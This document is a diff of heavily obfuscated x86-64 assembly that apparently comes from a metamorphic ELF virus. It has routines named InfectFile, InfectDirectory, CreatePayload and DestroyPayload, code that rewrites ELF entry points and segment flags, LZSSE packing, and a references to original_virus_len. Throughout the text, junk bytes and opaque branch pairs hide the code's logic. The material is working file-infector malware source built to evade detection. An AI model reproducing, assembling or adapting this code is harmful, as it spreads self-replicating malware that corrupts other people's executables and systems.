-    mov         rdi, QWORD [r5+file.fileptr]
-    mov         eax, 0x0
-    rep         stosb
-    jb          ..@S7YSLf3qmVKz
-    jae         ..@S7YSLf3qmVKz
-..@jVgWGHmGg8sU:
-    mov         eax, ebx
-    and         eax, edx
+db 0xaa
     jmp         $+4
-db 0x2b, 0x30
-    jmp         $+3
-db 0x97
-    jb          ..@EARyXOhFtNjA
-    jae         ..@EARyXOhFtNjA
-..@euuEa0fW43Iv:
-    lea         r1, [rsp+_INFFILE_OFF.file]
-    jmp         $+4
-db 0x73, 0xb6
-    jmp         $+5
-db 0x8e, 0x0f, 0x86
-    jl          ..@siWE1kcdeWrC
-    jge         ..@siWE1kcdeWrC
-..@eG0Mr33tpY9f:
-    mul         r2
-    add         rax, r1
-    jmp         $+5
-db 0x90, 0x83, 0xab
-    jmp         ..@76YFoVdf6LLy
-..@rSOURfNrjQur:
-    sub         rsp, _INFDIR_OFF_size
-    jmp         $+4
-db 0xcb, 0xf0
-    js          ..@UlnagV2qeBVj
-    jns         ..@UlnagV2qeBVj
-..@vgrXkZk9d9co:
-    sub         rsp, _LZSSE_OFF_size
-    js          ..@TRGNpw2karFK
-    jns         ..@TRGNpw2karFK
-InfectFile:
-    jmp         ..@vULqIXN9JSsi
-..@omUPQJ9iuqkO:
-%ifdef X86_64
-    mov         rcx, rdx
-%endif
-    jmp         $+5
-db 0x4a, 0x61, 0x12
-    jmp         ..@85t7Hrssn8AR
-..@ka0jQnnnblRE:
-    add         rbx, 1
-    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
-    cmp         bx, WORD [rsi+e_h.e_shnum]
-    jmp         $+5
-db 0x3b, 0x30, 0xc8
-    jmp         ..@ntBUmUnU5nBV
-..@av81zLgZcg5R:
-    jmp         ..@gQvvxN7q3uVp
-    js          ..@x6Omr3KMUToR
-    jns         ..@x6Omr3KMUToR
-..@5kP40eKhX3xu:
-    add         eax, 0x30
-    jb          ..@x0UQY5pbnCeo
-    jae         ..@x0UQY5pbnCeo
-..@FU9VppnTW1I7:
-    xor         rdx, rdx
-    jmp         $+3
-db 0xb1
-    jb          ..@sDVZbIHxTyI4
-    jae         ..@sDVZbIHxTyI4
-..@z4DgitkMtva6:
-%ifdef X86_32
-    mov         esi, 0x22
-    mov         edi, 0xffffffff
-%endif
-    jmp         $+4
-db 0xa2, 0x42
-    jmp         ..@XvrfEv7oyj2W
-..@vBaK7cKGmvIL:
-    je          ..@Xz94S5R0nMP4
-    jmp         ..@lsrxRNxO1dmY
-    jmp         $+5
-db 0x48, 0x13, 0xfc
-    jmp         ..@Xz94S5R0nMP4
-..@He2bMMJclM0I:
-    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
-    jmp         $+5
-db 0xbf, 0x09, 0x1a
-    jmp         $+4
-db 0x78, 0x95
-    jl          ..@1pTBN4XL8vj0
-    jge         ..@1pTBN4XL8vj0
-..@Ay0Bf7Fn2y08:
-    mov         rax, (-1)
-    jmp         $+4
-db 0x2c, 0x66
-    jmp         $+4
-db 0xff, 0x34
-    jmp         ..@ej65ZzKjvLsa
-..@rHSU8kEqdzop:
-    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
-    jmp         $+3
-db 0xb3
-    jb          ..@rB4GETD5ifYp
-    jae         ..@rB4GETD5ifYp
-..@n4xdSgJlbJnS:
-    cmp         rax, (-1)
-    je          ..@x6Omr3KMUToR
-    mov         r3, r4
-    je          ..@BLRs47JF4QMZ
-    jne         ..@BLRs47JF4QMZ
-..@BJptOqzVlZ3l:
-    cmp         QWORD m7, 0x00
-    je          ..@euuEa0fW43Iv
-    mov         r4, m7
-    jmp         $+4
-db 0x10, 0xe4
-    jl          ..@p37old7mfoaj
-    jge         ..@p37old7mfoaj
-..@dXV20F0IyeEX:
-    add         r1, 1
-    jmp         $+3
-db 0xe2
-    je          ..@M2nY5bqDxRtj
-    jne         ..@M2nY5bqDxRtj
-..@76YFoVdf6LLy:
-    pop         r1
-    js          ..@Q4m9ni0Rx1mo
-    jns         ..@Q4m9ni0Rx1mo
-..@owTMzOGEfuik:
-    add         eax, 0x57
-    jl          ..@2U7pgjbVf5pd
-    jge         ..@2U7pgjbVf5pd
-..@cTQIcHlqeoPc:
-    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
-    jmp         $+5
-db 0xe4, 0xa4, 0xa8
-    js          ..@xLBrgvzHONZy
-    jns         ..@xLBrgvzHONZy
-..@AqSZKmHmdrWy:
-    cmp         rax, 0x01
-    jl          ..@oTJlm0JwKNMX
-    jge         ..@oTJlm0JwKNMX
-..@C9p2avbLxfeE:
+db 0x78, 0x63
+    jmp         ..@5cGkiEfguI94
+..@jK29AMnrSIXE:
+    jne         ..@rZ7qNVQsHsgv
+    jb          ..@XfVfNAWujDt4
+    jae         ..@XfVfNAWujDt4
+..@xQvb7rRxqTnr:
     xor         rax, rax
-    mov         dx, WORD [rsp] 
-    js          ..@BdI5QirtH7bP
-    jns         ..@BdI5QirtH7bP
-..@tKdZEFRgeNtZ:
-    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
-    jmp         $+4
-db 0x66, 0x1c
-    jl          ..@jLSNbcFWHopA
-    jge         ..@jLSNbcFWHopA
-..@lE12NndRsRdq:
-%ifdef X86_32
-    mov         eax, SYS_MMAP2
-    int         0x80
-%endif
-    jmp         $+4
-db 0x3e, 0x2f
-    js          ..@YWNw5OKqSvoa
-    jns         ..@YWNw5OKqSvoa
-..@UGIplteGu2Gb:
-    mov         r1, QWORD [r5+file.filesize]
-    jmp         $+3
-db 0xe7
-    js          ..@V6EBjfRBvj0g
-    jns         ..@V6EBjfRBvj0g
-..@BLRs47JF4QMZ:
-    mov         r2, m6
-    jl          ..@5SYyXYGKcEx3
-    jge         ..@5SYyXYGKcEx3
-..@t6KrFk2IwK8k:
-    call        InfectDirectory
-    jmp         $+5
-db 0x58, 0xae, 0x10
-    jmp         $+3
-db 0x65
-    jl          ..@LJRX9uDEVLn3
-    jge         ..@LJRX9uDEVLn3
-..@wzl5lYJQvsar:
-    mov         r1, rax
-    jmp         ..@yQCo0WuuTd0F
-..@8JW2Wf1IaLnB:
-    mov         edx, 100000000b
-    js          ..@WnsLu5TfbnRm
-    jns         ..@WnsLu5TfbnRm
-..@VU40S43gw272:
-    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
-    mov         eax, 0x20
-    jb          ..@yoTdlj9hLBV1
-    jae         ..@yoTdlj9hLBV1
-..@2DKso2BiCrTh:
-    mov         r2, 1
-    jl          ..@t6KrFk2IwK8k
-    jge         ..@t6KrFk2IwK8k
-..@6ASJyskr16lF:
-    xor         rcx, rcx
-    jl          ..@QfYQX6WrtWqK
-    jge         ..@QfYQX6WrtWqK
-..@TbGj71un8pGT:
-    xor         rdi, rdi
-    xor         rcx, rcx
-    xor         rdx, rdx
-    jmp         $+5
-db 0xee, 0x04, 0x43
-    jb          ..@C9p2avbLxfeE
-    jae         ..@C9p2avbLxfeE
-..@xEPTpcUrD2Kg:
-    mov         r3, QWORD [r5+file.filesize]
-    jmp         ..@FoKo9L151E7b
-..@h5kKeLFLspuS:
-    push        r2
-    jmp         $+4
-db 0xab, 0xfa
-    jmp         ..@C0WeQk6sV2IE
-..@uaLv1ug2aDj3:
-    mov         QWORD [r1+e_h.e_entry], r3
-    jl          ..@G8J3qwFLkxsZ
-    jge         ..@G8J3qwFLkxsZ
-..@0wsSG15UStSf:
-    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
-    jmp         $+4
-db 0xc7, 0x43
-    jmp         $+5
-db 0x47, 0x1c, 0xba
-    jl          ..@0XgxzafaQmft
-    jge         ..@0XgxzafaQmft
-..@BHeBF6UoTDla:
-    je          ..@qVphEtHpxWcs
-    xor         r3, r3
-    mov         m6, rax
-    jmp         $+3
-db 0xd7
-    jl          ..@QWOi7apm6q45
-    jge         ..@QWOi7apm6q45
-..@hXaZZP74TQGS:
-    push        r5
-    push        r4
-    jmp         ..@RmwQj83G1alH
-..@0sBLE6lw0513:
-    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
-    jmp         $+5
-db 0xfa, 0xaa, 0xe2
-    jmp         $+3
-db 0x68
-    jmp         ..@7hzF7QHvjdP4
-..@VR9SyCt39z1P:
-    add         r4, 1
-    jmp         ..@av81zLgZcg5R
-..@zeIYTHDhyfcJ:
-    sub         rsp, _VADDR_OFF_size
-    jl          ..@xPj5oJzMZJBF
-    jge         ..@xPj5oJzMZJBF
-..@a9lbKICOBZ5r:
-    mov         r5, [rsp]
-    js          ..@CNomVVKX86Uz
-    jns         ..@CNomVVKX86Uz
-..@YSJsXRM0YsSr:
-    mov         r5, [rsp+_NBF_OFF.file]
-    mov         r1, QWORD [r5+file.fileptr]
-    mov         r2w, WORD [rsp+_NBF_OFF.index]
-    jl          ..@WThGw0GlGQ9o
-    jge         ..@WThGw0GlGQ9o
-NonBinaryFile:
-    jmp         ..@NXJ5uKe8qjlE
-..@NF0lXMBniLbp:
-    cmp         DWORD [r1+1], "home"
-    jmp         ..@fLW0lOAiStvm
-..@40pJEMZnuRUV:
-    jne         ..@y5oqMFwavmZD
-    jmp         ..@dEU9e7s2fJjp
-..@vKrj5fTFfEcj:
-    sub         rsi, m6
-    jmp         $+3
-db 0x68
-    je          ..@J565iULZN8EH
-    jne         ..@J565iULZN8EH
-..@sTNggXhmKe56:
-    add         rax, 4
-    jmp         ..@qidIwvHquVqk
-..@8rJYtOwNTCCE:
-    mov         rax, (-1)
-    js          ..@pND99SDFJXmC
-    jns         ..@pND99SDFJXmC
-..@qnAfwFfZP4Rz:
-    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
-    js          ..@rHSU8kEqdzop
-    jns         ..@rHSU8kEqdzop
-..@rufJA1mpg7vH:
-%ifdef X86_64
-    mov         eax, SYS_MMAP
-%endif
-    jmp         $+5
-db 0xbe, 0xf1, 0xa9
-    js          ..@GbvNTfagsbSZ
-    jns         ..@GbvNTfagsbSZ
-..@1fJNuZBTwev7:
-    add         rdi, rcx
-    add         rsi, rcx
-    sub         rdi, 1
-    jb          ..@X98vU0MVddqW
-    jae         ..@X98vU0MVddqW
-..@vinhmRIJvtGj:
-    add         r2, r1
-    jmp         $+5
-db 0xbc, 0x21, 0xd5
-    jmp         ..@LJqM4o0imLtz
-..@bvXh0QBcplpk:
-    mov         rdi, m6
-    add         rdi, non_packed_len
-    mov         m7, rdi
-    jmp         $+3
-db 0x1a
-    jmp         ..@92nN44UNodNG
-..@x6Omr3KMUToR:
-    call        DestroyPayload
-    jmp         $+5
-db 0x2f, 0x2f, 0x7b
-    jl          ..@euuEa0fW43Iv
-    jge         ..@euuEa0fW43Iv
-..@vjEEbCmDhFFh:
-    xor         rax, rax
-    ret
-    jmp         ..@KaTG2Mzx4E9f
-..@8XoilklbxX3T:
-    inc         WORD m5
-    jmp         ..@x6Omr3KMUToR
-    je          ..@7x8zIdwiS6Df
-    jne         ..@7x8zIdwiS6Df
-..@j0J7LnYF6mDD:
-    call        MemMove
-    jmp         $+4
-db 0xce, 0x6a
-    jmp         $+5
-db 0x4d, 0x21, 0xde
-    jl          ..@3IRQp1CDpSeS
-    jge         ..@3IRQp1CDpSeS
-..@OnITfync9t1X:
-    add         r1, non_packed_len+PADDING
-    mov         r2, m8
-    mov         r3, original_virus_len-non_packed_len
-    jmp         $+3
-db 0xa5
-    jl          ..@j0J7LnYF6mDD
-    jge         ..@j0J7LnYF6mDD
-..@p01cTd4s27QJ:
-    add         r1, _signature-_start
-    jmp         $+3
-db 0xd2
-    jmp         $+3
-db 0x77
-    jmp         ..@8TI8pLRyyz9L
-..@phwibm5BkCnE:
-    mov         QWORD [r5+file.filesize], 0x00
-    jmp         ..@rILw5VuCdXsp
-..@Bw88Vf6yt72I:
-    call        AddSizeMappedFile
-    jmp         $+5
-db 0x9a, 0x77, 0x3d
-    jmp         $+3
-db 0xe8
-    jmp         $+5
-db 0xda, 0x40, 0xa0
-    jmp         ..@n4xdSgJlbJnS
-..@t2VV5wOcTyqS:
-    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
-    jmp         $+3
-db 0x50
-    jmp         ..@ybxGIdtMjje3
-..@H5N9Wse746Gg:
-    lea         rdi, [rsp+_LZSSE_OFF.buffer]
-    jmp         ..@D8irPPg1u7r2
-..@3IRQp1CDpSeS:
+    mov         ax, WORD [r5+e_h.e_shentsize]
+    jb          ..@4rSSipskJqEz
+    jae         ..@4rSSipskJqEz
+..@FaUNt1bceu6m:
     xor         r2, r2
-    jmp         ..@RP2aG35z1M4L
-..@hWAu9P1sO9kb:
-    mov         r2, r1
-    add         r2, e_h.e_shoff
-    add         r1, QWORD [r2]
-    jmp         $+4
-db 0xa6, 0x02
-    jl          ..@x8mVuOrKh4f3
-    jge         ..@x8mVuOrKh4f3
-..@1vKfTaWOkNzl:
-    or          bx, ax
-    jmp         $+5
-db 0xe4, 0x92, 0x37
-    jmp         $+3
-db 0xd6
-    jmp         ..@jVgWGHmGg8sU
-..@rZoXNkbqVYdP:
-    jl          ..@5kP40eKhX3xu
-    jmp         ..@owTMzOGEfuik
-    jmp         $+5
-db 0x64, 0xa5, 0x5f
-    jmp         ..@5kP40eKhX3xu
-..@7vaX2I0MykWJ:
-    cmp         QWORD m6, 0x00
-    jmp         $+5
-db 0x5a, 0xcb, 0x5c
-    jb          ..@24io429cWiSu
-    jae         ..@24io429cWiSu
-..@GL51aeMXrvkM:
-    add         r5, QWORD [r4+rax+p_h.p_memsz]
-    jmp         ..@WGlI1NXXqwSY
-..@8MdioTqVJuxY:
-    jg          ..@vjEEbCmDhFFh
-    jmp         $+4
-db 0xc7, 0xe8
-    jmp         ..@dXV20F0IyeEX
-..@t1n9mnxBm196:
-    xor         rcx, rcx
-    xor         rbx, rbx
+    jl          ..@emjYrA44lYPe
+    jge         ..@emjYrA44lYPe
+..@4V0WiCVSx7LX:
+    mov         r1, QWORD [r5+e_h.e_shoff]
+    xor         r2, r2
+    mov         r2w, WORD [r5+e_h.e_shnum]
     jmp         $+3
 db 0x14
     jmp         $+3
-db 0x52
-    jb          ..@qHxRH7xKk6zA
-    jae         ..@qHxRH7xKk6zA
-..@FDNITf5PjDoB:
-    lea         r1, [rsp+_INFDIR_OFF.buffer]
-    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
-    jmp         $+3
-db 0x28
-    jmp         ..@9HzX29A27Syp
-..@jJDowb06RRfm:
-    jmp         ..@euuEa0fW43Iv
-    jb          ..@DvWom2mYU3HG
-    jae         ..@DvWom2mYU3HG
-..@M5yAUZFvIoos:
-    rep         movsb
-    jmp         $+5
-db 0x7d, 0x2c, 0xd7
-    jl          ..@gXtFxQ2HVyR0
-    jge         ..@gXtFxQ2HVyR0
-..@Z5dGYnofpNCy:
-%ifdef X86_32
-    xor         eax, eax
-    mov         ecx, original_virus_len+PADDING
-    mov         edx, 11b
-%endif
+db 0xa4
+    jmp         ..@xQvb7rRxqTnr
+..@YSmfw3iAb0qD:
+    syscall
+    cmp         rax, 0xffffffffffffffff
+    je          ..@u3eSpwI3CJEw
+    jl          ..@EYt5me9UaoIq
+    jge         ..@EYt5me9UaoIq
+..@T2pgqwjQxm1Z:
+    add         rsi, rdx
+    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
     jmp         $+4
-db 0xbd, 0xa6
-    jmp         $+4
-db 0x27, 0x6b
-    je          ..@z4DgitkMtva6
-    jne         ..@z4DgitkMtva6
-..@02ONdobWIwKZ:
-    jne         ..@UUiYVyRZYi4c
-    jmp         $+4
-db 0xb7, 0xe4
-    jmp         $+5
-db 0x51, 0x74, 0x0e
-    jmp         $+5
-db 0xfa, 0x8d, 0xe6
-    js          ..@Shgl9WRGRWLi
-    jns         ..@Shgl9WRGRWLi
-..@CbjOeNs2uB8E:
-    cmp         r4, 0x00
+db 0x6a, 0x9f
+    jmp         ..@GrTpQe5FK9bE
+..@RgYpBPPfuPHY:
+    cmp         rax, (-1)
+    je          ..@FTJjUvbnymZA
+    jne         ..@FTJjUvbnymZA
+..@6SFt36CqftJu:
+    add         rsp, _VADDR_OFF_size
+    pop         r1
+    ret
     jmp         $+3
-db 0x83
-    jl          ..@bmmhigOFW7no
-    jge         ..@bmmhigOFW7no
-..@HAiLpDez9q8i:
-    cmp         WORD [r1], '..'
-    je          ..@pKysl2wLF12v
-    jb          ..@n1S7xe2OADGy
-    jae         ..@n1S7xe2OADGy
-..@zoIUgqqBx2Ke:
-    jmp         ..@lsrxRNxO1dmY
-    jmp         ..@glpZTnE4Q9X4
-..@qhKKPmCa51RR:
-    mov         QWORD [r2+p_h.p_vaddr], r3
-    mov         QWORD [r2+p_h.p_paddr], r3
-    jmp         $+5
-db 0x8f, 0x24, 0xa7
-    js          ..@rQxax0Ln1Sbl
-    jns         ..@rQxax0Ln1Sbl
-..@lctHSL9ymoFj:
-    mov         BYTE [r1], 0x00
-    jmp         ..@oTU3rbr3VA5M
-..@XGdX1F3FC4ZE:
-    mov         QWORD [r5+file.filesize], rax
-    jmp         $+5
-db 0xe6, 0x6e, 0xc7
-    jmp         $+5
-db 0xd0, 0x1c, 0x2d
-    jmp         $+5
-db 0x8c, 0x9a, 0xa7
-    jl          ..@ZsvSNf7dJ8lb
-    jge         ..@ZsvSNf7dJ8lb
-..@iXlhLaWBaXn1:
-    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
-    mov         r4, 0
-    call        UpdateSignature
-    jl          ..@BqrBvFU1il9X
-    jge         ..@BqrBvFU1il9X
-..@rD2cXF7ZO4YY:
-    pop         r2
-    jmp         $+5
-db 0x32, 0x54, 0x75
-    jmp         $+3
-db 0x05
-    jl          ..@VzwrAbq0mqaJ
-    jge         ..@VzwrAbq0mqaJ
-..@AfEKvYci0mWA:
-    mov         r4d, DWORD [r1 + file.filefd]
-    mov         r5, r1
-    jmp         $+3
-db 0xca
+db 0x6e
     jmp         $+4
-db 0x87, 0xd7
-    jb          ..@UK8WKGhnb5YT
-    jae         ..@UK8WKGhnb5YT
-..@ePD4omuMtgwB:
-    xor         r1, r1
-    xor         r2, r2
-    xor         r3, r3
-    js          ..@w8Z7fews0leV
-    jns         ..@w8Z7fews0leV
-..@o8k4c1U1ZkLe:
+db 0x4d, 0xfb
+    jmp         DYNPIEValidation
+..@AT4Mi9T5InEx:
+    cmp         rcx, QWORD [rdi+s_h.sh_size]
+    jmp         ..@xebuhO6qp8CY
+..@ziSSMFPK2cam:
+    push        r1
+    xor         rdi, rdi
     xor         rcx, rcx
+    jmp         ..@xq8Kb3w9pHem
+..@HysXOoq8YAw3:
+    jg          ..@TP3zax1Pdf2L
     jmp         $+3
-db 0x67
+db 0x84
+    jmp         ..@rgefjWnk60U2
+..@pRuCC8QbneUs:
+    cmp         rax, 0
+    jmp         $+4
+db 0x9c, 0xe1
+    js          ..@Fodomj5itPSF
+    jns         ..@Fodomj5itPSF
+..@Ka5eOpjPkbWG:
+    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
+    jmp         $+3
+db 0xc1
+    jmp         ..@4tvjyHdGrguD
+CreatePayload:
+    jmp         ..@DgIEvZAlCfmP
+..@lAgMhlZTPycy:
+    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
+    jmp         ..@qKg4vdRgo52V
+..@5cGkiEfguI94:
+    sub         r1, 1
+    cmp         BYTE [r1], DT_DIR
+    jne         ..@F5GJP0OSwuvv
     jmp         $+5
-db 0x85, 0x30, 0x92
-    js          ..@cYkAzH0AcoVP
-    jns         ..@cYkAzH0AcoVP
-..@QZL7KSgZ8ywh:
-    and         r5, (PAGE_SIZE-1)
+db 0x92, 0x06, 0x6f
+    jmp         ..@P9eJzPAnxrp9
+..@nXWOTi2KpLc6:
+    xor         rax, rax
+    xor         rdi, rdi
+    jl          ..@QoXc5l0sIVEm
+    jge         ..@QoXc5l0sIVEm
+..@CbT9Jb8MUQQ9:
+    mov         r1, r5
+    call_vsp    Strlen
+    jmp         ..@nKIu22vEbPLt
+..@ZaxpSJZJOf1W:
+    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
+    jl          ..@2ohtfSct515l
+    jge         ..@2ohtfSct515l
+..@U2OeR3g8yKBU:
+    call        InfectDirectory
+    js          ..@Y3sATuHXbRQx
+    jns         ..@Y3sATuHXbRQx
+..@5yXTzM9nOrnz:
+    CFILE       DWORD [rsp+_PROC_OFF.filefd]
+    jmp         $+3
+db 0x41
+    jmp         $+3
+db 0x66
+    jmp         ..@F5GJP0OSwuvv
+..@Zq3kKy5r6JMo:
+    xor         rcx, rcx
+    xor         rbx, rbx
+    jb          ..@UW9MoKrI49p8
+    jae         ..@UW9MoKrI49p8
+..@jSqBCZSrL9NA:
+    call        MapFile
+    jl          ..@JSC2ybeWasgU
+    jge         ..@JSC2ybeWasgU
+..@oc8ckKAzxlXN:
+    test        eax, eax
+    jnz         ..@9mXnQCpM1lZS
+    jmp         $+3
+db 0x63
+    jmp         $+3
+db 0xed
+    jmp         $+5
+db 0x45, 0x86, 0xfa
+    jl          ..@b0M8V4CQhfqO
+    jge         ..@b0M8V4CQhfqO
+..@Ko57W1GOnZh9:
+    add         rsp, _NBF_OFF_size
+    jmp         $+4
+db 0xc9, 0x1e
+    jmp         ..@qdV1CVbXHecl
+..@dYfL5bIlrkXN:
+    rep         stosb
+    xor         r2, r2
+    jmp         ..@63uVPBpBSaNE
+..@YDtdfe1Sq8CO:
+    jmp         ..@0TFSreZN7avO
+    jmp         $+5
+db 0x39, 0xff, 0xf4
+    je          ..@K20YvJKbMacp
+    jne         ..@K20YvJKbMacp
+..@MRWFi7IITEL5:
+    jmp         ..@R4FxM6IERCtl
+    jmp         $+5
+db 0x47, 0x1d, 0x3c
+    jmp         ..@ebFiM4AFQUuw
+..@QoXc5l0sIVEm:
+    xor         rcx, rcx
+    jmp         $+5
+db 0x40, 0xc2, 0xeb
+    jmp         ..@DF40Ye6VsElw
+..@be6BcuOpQGuC:
+    jmp         ..@hgE5w6Fo7uHx
+    jmp         ..@u3eSpwI3CJEw
+..@PEUVk47jwmlL:
     add         r3, r5
     mov         r4, r3
-    jmp         $+4
-db 0x8f, 0x8f
-    js          ..@WsiYH3eT8f0j
-    jns         ..@WsiYH3eT8f0j
-..@6RoGOIM2nDHk:
-    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
-    call        WORDToDWORDASCII
+    jb          ..@gI4riGJKnxAm
+    jae         ..@gI4riGJKnxAm
+..@smKLMgXPkga9:
+    add         r1, signature_len-1
+    jb          ..@WwCvxZMXDbza
+    jae         ..@WwCvxZMXDbza
+..@h8utXn83wrLY:
+    mov         r1, QWORD [r5+file.filesize]
+    cmp         r1, e_h_size
+    jge         ..@j8XgoH9G9ifr
     jmp         $+3
-db 0xc0
-    jmp         ..@bH15DR3j5wXW
-..@aF6hf4UB6MPi:
-    lea         r1, [rsp+_INFDIR_OFF.buffer]
+db 0x58
+    jmp         ..@HH4BDrotzimV
+..@JdKyMMUhxL96:
+    mov         r1, rax
+    xor         r2, r2
+    xor         r3, r3
     jmp         $+4
-db 0xd8, 0xe9
-    jmp         $+4
-db 0x17, 0xb2
-    js          ..@J0cTxm5Z04sQ
-    jns         ..@J0cTxm5Z04sQ
-..@9dYDPlOQ1qqq:
-    mov         r1, m6
-    jb          ..@p01cTd4s27QJ
-    jae         ..@p01cTd4s27QJ
-..@79Y67X3uJrj6:
-    mov         rax, QWORD [rsi+rcx+bytes]
-    and         rax, DF_1_PIE
-    jmp         ..@PnKaLwI05pXi
-..@vQ0VrkAdF9lJ:
-    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
-    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
-    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
-    jmp         ..@6iHaSqzKkkPE
-IsELFComplete:
-    jmp         ..@3ic6DhI0ASvE
-..@m2pGt0M8bhFg:
-    cmp         rax, 0x00
-    jl          ..@Tz071gMscT7I
-    xor         r4, r4
-    jmp         $+4
-db 0x2a, 0xec
-    jl          ..@1Tye1sI1G11J
-    jge         ..@1Tye1sI1G11J
-..@ULdlO5sCBaEo:
-    mov         rcx, m7
-    sub         rcx, m6
-    mov         eax, 0x00
-    jmp         $+5
-db 0x30, 0x32, 0xb1
-    js          ..@binAT9m3fVDc
-    jns         ..@binAT9m3fVDc
-..@teIXRbExsdIU:
-    jne         ..@7x8zIdwiS6Df
-    jmp         $+5
-db 0x8d, 0x55, 0x2f
-    jmp         ..@tZkZmvBKDdwL
-..@Pmf2jTsNK6XL:
-    jle         ..@BwHnreKiyFUD
-    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
-    jmp         $+5
-db 0x8c, 0xa0, 0xbd
+db 0x68, 0x00
+    jl          ..@GMLPTT7m5SkP
+    jge         ..@GMLPTT7m5SkP
+..@KJ91uacatmQI:
+    VAR         packed, procs
     jmp         $+3
-db 0xb7
-    jmp         ..@s3CQhgvYrxm3
-..@7rDilQGfzbZy:
-    lea         r1, [rsp+_INFFILE_OFF.file]
-    jmp         ..@Kv12tsZ0hliT
-..@KaTG2Mzx4E9f:
-    mov         eax, 1
+db 0x79
+    jmp         $+5
+db 0xf0, 0xe0, 0xe3
+    jmp         ..@33Q4If3rtkYg
+..@VIl87moDF44G:
+    push        r5
+    jmp         $+5
+db 0xd3, 0xfc, 0x12
+    js          ..@8E6n7NgFN6PI
+    jns         ..@8E6n7NgFN6PI
+..@pM2PNzAOCOMk:
+    push        r5
+    sub         rsp, _UPDATASIG_OFF_size
+    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
+    jl          ..@TxnqhqKazGEX
+    jge         ..@TxnqhqKazGEX
+..@7AzfoYaFybFW:
     ret
     jmp         $+4
-db 0xcf, 0x5b
-    js          Strcpy
-    jns         Strcpy
-..@XvrfEv7oyj2W:
-%ifdef X86_32
-    push        ebp
-    xor         ebp, ebp
-    mov         eax, SYS_MMAP2
+db 0xe8, 0x47
+    jl          ..@YGvCtyV1laIX
+    jge         ..@YGvCtyV1laIX
+..@tBygYHEDB0ev:
+    push        r4
+    jmp         $+4
+db 0xcb, 0x34
+    jb          ..@pM2PNzAOCOMk
+    jae         ..@pM2PNzAOCOMk
+..@PELDalgIzKzL:
+    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
+    jmp         ..@ksG3E592URJM
+..@ft9ixVzokrKr:
+%ifdef X86_64
+    xor         r9, r9
+    mov         rsi, QWORD [r8+file.filesize]
 %endif
-    jmp         $+3
-db 0x3e
-    jmp         $+3
-db 0xc0
-    jmp         ..@Wr9LCKKCOVq5
-..@1YEJrEQ3c3Rs:
-    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
-    jl          ..@ZZcEz2nWKggd
-    jge         ..@ZZcEz2nWKggd
-..@xC6QOrzoOLUT:
-    mov         r3, non_packed_len
-    call        MemMove
-    jmp         ..@vJD07H5GOYam
-..@24io429cWiSu:
-    je          ..@euuEa0fW43Iv
     jmp         $+5
-db 0xd3, 0x47, 0xbe
-    js          ..@BJptOqzVlZ3l
-    jns         ..@BJptOqzVlZ3l
-..@GgSvNHpQARbw:
-    push        r1
+db 0xed, 0xc8, 0x92
+    jb          ..@KF0eJeiscMqz
+    jae         ..@KF0eJeiscMqz
+..@XRUKR0kN8b25:
+    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
+    call        Strcpy
+    js          ..@UaHgTkrnephY
+    jns         ..@UaHgTkrnephY
+MapFile:
+    jmp         ..@t72eQN8DIfP3
+InfectFile:
+    jmp         ..@DzSAkiy6D7Fb
+..@AKKpTyEdzWi5:
+    mov         rdi, m6
+    jmp         $+3
+db 0x74
+    jmp         $+5
+db 0xcc, 0xbd, 0x09
+    js          ..@uvKPMbLEa5kL
+    jns         ..@uvKPMbLEa5kL
+..@zsh4RuWlDQCS:
+    mov         r5, r3
+    jmp         $+5
+db 0xda, 0xf9, 0xc5
+    jb          ..@eZgpzd7Y37PK
+    jae         ..@eZgpzd7Y37PK
+..@H2uflChhbadf:
+    OFILE       [r1], 0x10000
+    jmp         $+5
+db 0xb2, 0xc6, 0x8c
+    jl          ..@mU56aDurDmUw
+    jge         ..@mU56aDurDmUw
+..@mkEbUBw5QjK2:
+    sub         rsp, _INFDIR_OFF_size
+    jmp         $+3
+db 0xf8
+    jmp         ..@xRvy4WEkC6ZF
+..@oz0w6dKg0d2f:
+    lea         r1, [rsp+_INFFILE_OFF.file]
+    jb          ..@MPA0PN1EMzAQ
+    jae         ..@MPA0PN1EMzAQ
+..@HTxpQXfBEGGO:
+    mov         QWORD [rsp+_LZSSE_OFF.length], r2
+    js          ..@nXWOTi2KpLc6
+    jns         ..@nXWOTi2KpLc6
+..@Ni2CGNpMTv9e:
+    xor         rdx, rdx
+    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
+    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
+    jmp         $+3
+db 0x6f
+    js          ..@XpZ3fLZotp95
+    jns         ..@XpZ3fLZotp95
+..@5NbC2vKra5FA:
+    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
+    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
+    jmp         ..@nPFo2IJ5tWSF
+..@ljb9zJ1jAXr6:
+    OFILE       [rsp+_PROC_OFF.buffer], 0x00
+    cmp         eax, 0x3
+    js          ..@gL9qOJf82HFz
+    jns         ..@gL9qOJf82HFz
+..@u01arBYN9hMA:
+    je          ..@oz0w6dKg0d2f
+    mov         r4, m7
+    sub         r4, m6
+    jmp         $+3
+db 0x7b
+    jb          ..@pfnPahA61d3X
+    jae         ..@pfnPahA61d3X
